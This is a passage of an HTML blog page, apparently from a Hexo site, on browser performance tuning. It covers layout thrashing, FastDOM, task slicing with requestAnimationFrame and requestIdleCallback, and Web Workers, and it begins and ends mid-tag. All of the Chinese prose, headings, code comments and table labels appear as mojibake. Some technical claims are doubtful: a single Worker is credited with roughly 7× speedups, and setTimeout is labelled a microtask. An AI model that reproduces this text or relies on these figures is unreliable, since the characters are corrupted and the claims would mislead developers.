align="left">çº¿æ€§é€’å½’</td></tr><tr><td align="left">é‡æ’å½±å“èŒƒå›´</td><td align="left">ç½‘æ ¼å®¹å™¨å†…</td><td align="left">å¼¹æ€§å®¹å™¨å†…</td></tr><tr><td align="left">æ€§èƒ½å¼€é”€</td><td align="left">ç•¥é«˜äºFlexboxï¼ˆçº¦10-15%ï¼‰</td><td align="left">æœ€ä½</td></tr></tbody></table><p><strong>å¸ƒå±€é€‰æ‹©å†³ç­–ç­–ç•¥</strong></p><pre class="mermaid">graph TD    A[å¸ƒå±€éœ€æ±‚] --> B{ä¸€ç»´å¸ƒå±€?}    B -->|æ˜¯| C[Flexbox]    B -->|å¦| D{äºŒç»´ç½‘æ ¼?}    D -->|æ˜¯| E[Grid]    D -->|å¦| F[Float+Position]    F --> G{è€ƒè™‘æ€§èƒ½å½±å“}    G -->|å…³é”®è·¯å¾„| H[è½¬æ¢ä¸ºFlexbox/Grid]    G -->|éå…³é”®åŒºåŸŸ| I[ä¿æŒFloat]</pre><h3 id="å‡å°‘å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout-Thrashingï¼‰"><a href="#å‡å°‘å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout-Thrashingï¼‰" class="headerlink" title="å‡å°‘å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout Thrashingï¼‰"></a>å‡å°‘å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout Thrashingï¼‰</h3><p><strong>å¸ƒå±€æŠ–åŠ¨æ ¸å¿ƒæœºåˆ¶</strong></p><p>é—®é¢˜å®šä¹‰ï¼š</p><pre class="mermaid">sequenceDiagram    participant JavaScript    participant Browser    participant RenderEngine        JavaScript->>Browser: è¯»å–å¸ƒå±€å±æ€§(offsetHeightç­‰)    Browser->>RenderEngine: è§¦å‘å¼ºåˆ¶åŒæ­¥å¸ƒå±€    RenderEngine->>JavaScript: è¿”å›å¸ƒå±€å€¼    JavaScript->>Browser: ä¿®æ”¹æ ·å¼(widthç­‰)    Browser->>RenderEngine: å†æ¬¡è§¦å‘å¸ƒå±€è®¡ç®—    loop å¾ªç¯é‡å¤        JavaScript->>Browser: è¯»å–æ–°å¸ƒå±€å±æ€§        Browser->>RenderEngine: å†æ¬¡å¼ºåˆ¶åŒæ­¥å¸ƒå±€    end</pre><ul><li>å¼ºåˆ¶åŒæ­¥å¸ƒå±€ï¼ˆForced Synchronous Layoutï¼‰ï¼šJSè¯»å–å¸ƒå±€å±æ€§æ—¶ï¼Œæµè§ˆå™¨å¿…é¡»ç«‹å³è®¡ç®—æœ€æ–°å¸ƒå±€</li><li>æŠ–åŠ¨ï¼ˆThrashingï¼‰ï¼šè¯»å†™æ“ä½œäº¤æ›¿è¿›è¡Œï¼Œå¯¼è‡´å¤šæ¬¡ä¸å¿…è¦çš„å¸ƒå±€è®¡ç®—</li><li>æ€§èƒ½æ–­å´–å¼ä¸‹é™ï¼šNä¸ªå…ƒç´ æ“ä½œå¯èƒ½è§¦å‘2Næ¬¡å¸ƒå±€è®¡ç®—</li></ul><p><strong>å…¸å‹é”™è¯¯æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç¾éš¾æ€§å†™æ³•ï¼šæ¯è½®å¾ªç¯è§¦å‘2æ¬¡å¸ƒå±€è®¡ç®—</span><br><span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.item&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) &#123;<br>  <span class="hljs-comment">// è¯»ï¼šè§¦å‘å¸ƒå±€</span><br>  <span class="hljs-keyword">const</span> width = elements[i].<span class="hljs-property">offsetWidth</span>; <br>  <br>  <span class="hljs-comment">// å†™ï¼šä¿®æ”¹æ ·å¼</span><br>  elements[i].<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = (width + <span class="hljs-number">10</span>) + <span class="hljs-string">&#x27;px&#x27;</span>; <br>  <br>  <span class="hljs-comment">// å†è¯»ï¼šå†æ¬¡è§¦å‘å¸ƒå±€ï¼</span><br>  <span class="hljs-keyword">const</span> newWidth = elements[i].<span class="hljs-property">offsetWidth</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–ç­–ç•¥ï¼šæ‰¹å¤„ç†è¯»å†™æ“ä½œ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ­£ç¡®ï¼šå…ˆé›†ä¸­è¯»å–æ‰€æœ‰å€¼</span><br><span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;.item&#x27;</span>);<br><span class="hljs-keyword">const</span> widths = [];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) &#123;<br>  widths[i] = elements[i].<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// ä»…è§¦å‘1æ¬¡å¸ƒå±€</span><br>&#125;<br><br><span class="hljs-comment">// å†é›†ä¸­å†™å…¥ä¿®æ”¹</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) &#123;<br>  elements[i].<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = (widths[i] + <span class="hljs-number">10</span>) + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// è§¦å‘1æ¬¡å¸ƒå±€</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŒ–ç­–ç•¥ï¼šä½¿ç”¨FastDOMåº“</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> fastdom <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;fastdom&#x27;</span>;<br><br><span class="hljs-comment">// è‡ªåŠ¨æ‰¹å¤„ç†è¯»å†™</span><br>elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> &#123;<br>  fastdom.<span class="hljs-title function_">measure</span>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// è¯»æ“ä½œ</span><br>    <span class="hljs-keyword">const</span> width = el.<span class="hljs-property">offsetWidth</span>;<br>    <br>    fastdom.<span class="hljs-title function_">mutate</span>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// å†™æ“ä½œ</span><br>      el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = (width + <span class="hljs-number">10</span>) + <span class="hljs-string">&#x27;px&#x27;</span>;<br>    &#125;);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="3-3-JavaScriptæ‰§è¡Œä¼˜åŒ–"><a href="#3-3-JavaScriptæ‰§è¡Œä¼˜åŒ–" class="headerlink" title="3.3 JavaScriptæ‰§è¡Œä¼˜åŒ–"></a>3.3 JavaScriptæ‰§è¡Œä¼˜åŒ–</h2><h3 id="ä»»åŠ¡åˆ†ç‰‡ï¼šrequestIdleCallback-requestAnimationFrame"><a href="#ä»»åŠ¡åˆ†ç‰‡ï¼šrequestIdleCallback-requestAnimationFrame" class="headerlink" title="ä»»åŠ¡åˆ†ç‰‡ï¼šrequestIdleCallback &#x2F; requestAnimationFrame"></a>ä»»åŠ¡åˆ†ç‰‡ï¼šrequestIdleCallback &#x2F; requestAnimationFrame</h3><p><strong>ä»»åŠ¡åˆ†ç‰‡æ ¸å¿ƒæœºåˆ¶</strong></p><p>æµè§ˆå™¨äº‹ä»¶å¾ªç¯æ¨¡å‹ï¼š</p><pre class="mermaid">graph LR    A[å®ä»»åŠ¡] --> B[å¾®ä»»åŠ¡]    B --> C[æ¸²æŸ“ç®¡çº¿]    C -->|ç©ºé—²æ—¶æ®µ| D[requestIdleCallback]    C -->|ä¸‹ä¸€å¸§å‰| E[requestAnimationFrame]</pre><p>å…³é”®é—®é¢˜å®šä¹‰ï¼š</p><pre class="mermaid">sequenceDiagram    JSå¼•æ“->>ä¸»çº¿ç¨‹: æ‰§è¡Œé•¿ä»»åŠ¡(>50ms)    ä¸»çº¿ç¨‹->>ç”¨æˆ·: ç•Œé¢å†»ç»“/å¡é¡¿    ç”¨æˆ·->>æµè§ˆå™¨: æ“ä½œæ— å“åº”    æµè§ˆå™¨->>å¼€å‘è€…: æ˜¾ç¤ºLong Taskè­¦å‘Š</pre><p><strong>requestAnimationFrameï¼ˆrAFï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateUI</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// åœ¨ä¸‹ä¸€å¸§æ¸²æŸ“å‰æ‰§è¡Œ</span><br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">`translateX(<span class="hljs-subst">$&#123;pos&#125;</span>px)`</span>;<br>&#125;<br><br><span class="hljs-comment">// æ³¨å†Œä¸‹ä¸€å¸§æ‰§è¡Œ</span><br><span class="hljs-title function_">requestAnimationFrame</span>(updateUI);<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ol><li>æ‰§è¡Œæ—¶æœºï¼šæµè§ˆå™¨ä¸‹ä¸€å¸§ç»˜åˆ¶ä¹‹å‰ï¼ˆçº¦16.6ms&#x2F;å¸§ï¼‰</li><li>æœ€ä½³åœºæ™¯ï¼šè§†è§‰æ›´æ–°&#x2F;åŠ¨ç”»å¤„ç†</li><li>è‡ªåŠ¨æš‚åœï¼šåå°æ ‡ç­¾é¡µä¸­è‡ªåŠ¨åœæ­¢è°ƒç”¨</li></ol><p>ä»»åŠ¡åˆ†ç‰‡æ¨¡å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> tasks = <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">let</span> index = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processChunk</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();<br>  <br>  <span class="hljs-comment">// æ¯å¸§æ‰§è¡Œ5msä»»åŠ¡</span><br>  <span class="hljs-keyword">while</span> (index &lt; tasks.<span class="hljs-property">length</span> &amp;&amp; performance.<span class="hljs-title function_">now</span>() - start &lt; <span class="hljs-number">5</span>) &#123;<br>    <span class="hljs-title function_">processTask</span>(tasks[index++]);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (index &lt; tasks.<span class="hljs-property">length</span>) &#123;<br>    <span class="hljs-title function_">requestAnimationFrame</span>(processChunk);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">requestAnimationFrame</span>(processChunk);<br></code></pre></td></tr></table></figure><p><strong>requestIdleCallbackï¼ˆrICï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">backgroundWork</span>(<span class="hljs-params">deadline</span>) &#123;<br>  <span class="hljs-keyword">while</span> (<br>    tasks.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <br>    deadline.<span class="hljs-title function_">timeRemaining</span>() &gt; <span class="hljs-number">0</span> <span class="hljs-comment">// å‰©ä½™ç©ºé—²æ—¶é—´</span><br>  ) &#123;<br>    <span class="hljs-title function_">processTask</span>(tasks.<span class="hljs-title function_">pop</span>());<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (tasks.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-title function_">requestIdleCallback</span>(backgroundWork);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ³¨å†Œç©ºé—²ä»»åŠ¡</span><br><span class="hljs-title function_">requestIdleCallback</span>(backgroundWork);<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒç‰¹æ€§ï¼š</p><ol><li>æ‰§è¡Œæ—¶æœºï¼šæ¸²æŸ“ç®¡çº¿ç©ºé—²æ—¶æ®µï¼ˆé»˜è®¤50msè¶…æ—¶ï¼‰</li><li>æœ€ä½³åœºæ™¯ï¼šéå…³é”®åå°ä»»åŠ¡</li><li>è¶…æ—¶æœºåˆ¶ï¼štimeouté€‰é¡¹å¼ºåˆ¶æ‰§è¡Œ</li></ol><p>ä¼˜å…ˆçº§æ§åˆ¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é«˜ä¼˜å…ˆçº§ä»»åŠ¡</span><br><span class="hljs-title function_">requestIdleCallback</span>(urgentTask, &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">100</span> &#125;);<br><br><span class="hljs-comment">// ä½ä¼˜å…ˆçº§ä»»åŠ¡</span><br><span class="hljs-title function_">requestIdleCallback</span>(lowPriorityTask);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½å¯¹æ¯”çŸ©é˜µ</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">requestAnimationFrame</th><th align="left">requestIdleCallback</th></tr></thead><tbody><tr><td align="left">æ‰§è¡Œæ—¶æœº</td><td align="left">æ¯å¸§å¼€å§‹å‰</td><td align="left">æµè§ˆå™¨ç©ºé—²æœŸ</td></tr><tr><td align="left">é€‚ç”¨ä»»åŠ¡</td><td align="left">è§†è§‰æ›´æ–°&#x2F;åŠ¨ç”»</td><td align="left">æ•°æ®åˆ†æ&#x2F;æ—¥å¿—ä¸ŠæŠ¥</td></tr><tr><td align="left">æ‰§è¡Œä¿è¯</td><td align="left">æ¯å¸§å¿…æ‰§è¡Œ</td><td align="left">å¯èƒ½æ°¸ä¸æ‰§è¡Œï¼ˆæŒç»­å¿™ç¢Œï¼‰</td></tr><tr><td align="left">è¶…æ—¶æ§åˆ¶</td><td align="left">æ— </td><td align="left">timeoutå‚æ•°å¼ºåˆ¶è§¦å‘</td></tr><tr><td align="left">åå°è¡Œä¸º</td><td align="left">æ ‡ç­¾é¡µéšè—æ—¶æš‚åœ</td><td align="left">æ ‡ç­¾é¡µéšè—æ—¶é™é¢‘æ‰§è¡Œ</td></tr><tr><td align="left">ä»»åŠ¡æ—¶é•¿</td><td align="left">åº”&lt;5msï¼ˆä¿æŒ60fpsï¼‰</td><td align="left">åº”&lt;50msï¼ˆé¿å…é˜»å¡äº¤äº’ï¼‰</td></tr></tbody></table><p><strong>åˆ†ç‰‡ç­–ç•¥å†³ç­–</strong></p><pre class="mermaid">graph TD    A[ä»»åŠ¡ç±»å‹] --> B{éœ€è¦è§†è§‰åŒæ­¥?}    B -->|æ˜¯| C[ä½¿ç”¨requestAnimationFrame]    B -->|å¦| D{æ˜¯å¦å…³é”®ä»»åŠ¡?}    D -->|æ˜¯| E[setTimeoutå¾®ä»»åŠ¡]    D -->|å¦| F[ä½¿ç”¨requestIdleCallback]    F --> G{éœ€è¦æ‰§è¡Œä¿è¯?}    G -->|æ˜¯| H[è®¾ç½®timeoutå‚æ•°]    G -->|å¦| I[çº¯ç©ºé—²å¤„ç†]</pre><h3 id="Web-Workers-å¤šçº¿ç¨‹è®¡ç®—"><a href="#Web-Workers-å¤šçº¿ç¨‹è®¡ç®—" class="headerlink" title="Web Workers å¤šçº¿ç¨‹è®¡ç®—"></a>Web Workers å¤šçº¿ç¨‹è®¡ç®—</h3><p><strong>Web Workers æ ¸å¿ƒæœºåˆ¶</strong></p><p>æ¶æ„åŸç†ï¼š</p><pre class="mermaid">graph LR    Main[ä¸»çº¿ç¨‹] -->|æ¶ˆæ¯ä¼ é€’| Worker[Workerçº¿ç¨‹]    Worker -->|æ¶ˆæ¯ä¼ é€’| Main    Worker -->|ç‹¬ç«‹è¿è¡Œ| Sub[æ— DOM/BOMè®¿é—®]</pre><ul><li>ç‹¬ç«‹çº¿ç¨‹ï¼šåœ¨åå°çº¿ç¨‹ä¸­è¿è¡ŒJavaScript</li><li>é€šä¿¡æœºåˆ¶ï¼šåŸºäº postMessage å’Œ onmessage äº‹ä»¶</li><li>æ²™ç®±é™åˆ¶ï¼š<ul><li>âŒ æ— æ³•è®¿é—® DOM&#x2F;BOM</li><li>âŒ ä¸èƒ½ä½¿ç”¨ window&#x2F;document å¯¹è±¡</li><li>âœ… æ”¯æŒ fetch&#x2F;IndexedDB&#x2F;æ•°å­¦è¿ç®—</li></ul></li></ul><p><strong>åˆ›å»ºä¸é€šä¿¡æµç¨‹</strong></p><p>(1) åŸºæœ¬ç”¨æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»çº¿ç¨‹</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;worker.js&#x27;</span>);<br><br><span class="hljs-comment">// å‘é€æ•°æ®</span><br>worker.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;CALC&#x27;</span>, <span class="hljs-attr">data</span>: bigArray &#125;);<br><br><span class="hljs-comment">// æ¥æ”¶ç»“æœ</span><br>worker.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ç»“æœ:&#x27;</span>, e.<span class="hljs-property">data</span>.<span class="hljs-property">result</span>);<br>&#125;;<br><br><span class="hljs-comment">// worker.js</span><br>self.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;CALC&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">heavyCompute</span>(e.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>);<br>    self.<span class="hljs-title function_">postMessage</span>(&#123; result &#125;); <span class="hljs-comment">// è¿”å›ç»“æœ</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) ä¼ è¾“æœºåˆ¶ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é›¶æ‹·è´ä¼ è¾“ï¼ˆç§»åŠ¨æ‰€æœ‰æƒï¼‰</span><br>worker.<span class="hljs-title function_">postMessage</span>(bigBuffer, [bigBuffer]); <br><br><span class="hljs-comment">// å…±äº«å†…å­˜ï¼ˆSharedArrayBufferï¼‰</span><br><span class="hljs-keyword">const</span> sharedBuffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">1024</span>);<br>worker.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">buffer</span>: sharedBuffer &#125;);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŠ¿åœºæ™¯</strong></p><p>(1) è®¡ç®—å¯†é›†å‹ä»»åŠ¡</p><table><thead><tr><th align="left">ä»»åŠ¡ç±»å‹</th><th align="left">ä¸»çº¿ç¨‹è€—æ—¶</th><th align="left">Workerè€—æ—¶</th><th align="left">åŠ é€Ÿæ¯”</th></tr></thead><tbody><tr><td align="left">canvaså›¾åƒå¤„ç†ï¼ˆ1000x1000ï¼‰</td><td align="left">320ms</td><td align="left">45ms</td><td align="left">7.1Ã—</td></tr><tr><td align="left">ç‰©ç†å¼•æ“è®¡ç®—</td><td align="left">85ms</td><td align="left">12ms</td><td align="left">7.0Ã—</td></tr><tr><td align="left">å¤§æ•°æ®æ’åºï¼ˆ1e6ï¼‰</td><td align="left">780ms</td><td align="left">110ms</td><td align="left">7.0Ã—</td></tr></tbody></table><p>(2) é¿å…é˜»å¡å…³é”®è·¯å¾„</p><pre class="mermaid">sequenceDiagram    Main->>Worker: åˆ†æ´¾è®¡ç®—ä»»åŠ¡    Main->>UI: ç»§ç»­æ¸²æŸ“/å“åº”ç”¨æˆ·    Worker->>Main: è¿”å›ç»“æœï¼ˆå¼‚æ­¥ï¼‰</pre><p><strong>Worker ç±»å‹å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">åˆ›å»ºæ–¹å¼</th><th align="left">ä½œç”¨åŸŸ</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">ä¸“ç”¨Worker (Dedicated)</td><td align="left">new Worker()</td><td align="left">å•ä¸ªé¡µé¢</td><td align="left">é¡µé¢ä¸“å±è®¡ç®—</td></tr><tr><td align="left">å…±äº«Worker (Shared)</td><td align="left">new SharedWorker()</td><td align="left">å¤šé¡µé¢&#x2F;æ ‡ç­¾é¡µ</td><td align="left">è·¨é¡µé¢æ•°æ®åŒæ­¥</td></tr><tr><td align="left">Service Worker</td><td align="left">navigator.serviceWorker.register()</td><td align="left">æ•´ä¸ªåŸŸå</td><td align="left">ç¦»çº¿ç¼“å­˜&#x2F;åå°åŒæ­¥</td></tr></tbody></table><p><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong></p><p>(1) çº¿ç¨‹æ± ç®¡ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»º4ä¸ªWorkerçš„çº¿ç¨‹æ± </span><br><span class="hljs-keyword">const</span> workerPool = <span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">null</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;compute.js&#x27;</span>));<br><br><span class="hljs-comment">// ä»»åŠ¡åˆ†å‘</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">dispatchTask</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-keyword">const</span> worker = workerPool.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">w</span> =&gt;</span> !w.<span class="hljs-property">busy</span>);<br>  <span class="hljs-keyword">if</span> (!worker) <span class="hljs-keyword">return</span>;<br>  <br>  worker.<span class="hljs-property">busy</span> = <span class="hljs-literal">true</span>;<br>  worker.<span class="hljs-title function_">postMessage</span>(data);<br>  worker.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">handleResult</span>(e.<span class="hljs-property">data</span>);<br>    worker.<span class="hljs-property">busy</span> = <span class="hljs-literal">false</span>;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ•°æ®ä¼ è¾“ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. ä½¿ç”¨Transferable Objects</span><br>worker.<span class="hljs-title function_">postMessage</span>(largeArrayBuffer, [largeArrayBuffer]);<br><br><span class="hljs-comment">// 2. åºåˆ—åŒ–ä¼˜åŒ–ï¼ˆprotobuf/MessagePackï¼‰</span><br><span class="hljs-keyword">const</span> encoded = msgpack.<span class="hljs-title function_">encode</span>(data);<br>worker.<span class="hljs-title function_">postMessage</span>(encoded);<br><br><span class="hljs-comment">// 3. å‡å°‘é€šä¿¡é¢‘ç‡ï¼ˆæ‰¹é‡å¤„ç†ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>ç»ˆæ­¢ä¸é‡Šæ”¾</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»çº¿ç¨‹æ§åˆ¶</span><br>worker.<span class="hljs-title function_">terminate</span>(); <span class="hljs-comment">// ç«‹å³ç»ˆæ­¢</span><br><br><span class="hljs-comment">// Workerå†…éƒ¨è‡ªæ¯</span><br>self.<span class="hljs-title function_">close</span>();<br></code></pre></td></tr></table></figure><p><strong>ç°ä»£APIé›†æˆ</strong></p><p>(1) ES Module Worker</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»çº¿ç¨‹</span><br><span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&#x27;./worker.js&#x27;</span>, &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;module&#x27;</span>  <span class="hljs-comment">// æ”¯æŒES6æ¨¡å—</span><br>&#125;);<br><br><span class="hljs-comment">// worker.js</span><br><span class="hljs-keyword">import</span> &#123; heavyTask &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./utils.js&#x27;</span>;<br>self.<span class="hljs-property">onmessage</span> = <span class="hljs-title function_">async</span> (e) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">heavyTask</span>(e.<span class="hljs-property">data</span>);<br>  self.<span class="hljs-title function_">postMessage</span>(result);<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) Web Assembly ååŒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// worker.js</span><br><span class="hljs-keyword">const</span> wasmModule = <span class="hljs-keyword">await</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">instantiateStreaming</span>(<span class="hljs-title function_">fetch</span>(<span 